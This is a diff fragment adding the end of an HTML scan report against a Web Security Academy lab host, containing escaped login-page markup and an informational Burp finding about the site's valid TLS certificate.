+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [burp] TLS certificate</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The server presented a valid, trusted TLS certificate. This issue is purely informational.&lt;br&gt;&lt;br&gt;The server presented the following certificates:&lt;br&gt;&lt;br&gt;&lt;h4&gt;Server certificate&lt;/h4&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued to:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued by:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Amazon RSA 2048 M01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Valid from:&lt;/b&gt;&amp;nbsp;&amp;nb @ https://0a460024044074f283fb32c700b20073.web-security-academy.net/</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6rifql-2u</code> — <code>artifacts/_/ev-mr6rifql-2u/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0</pre></div>
+</div>
+</body></html>
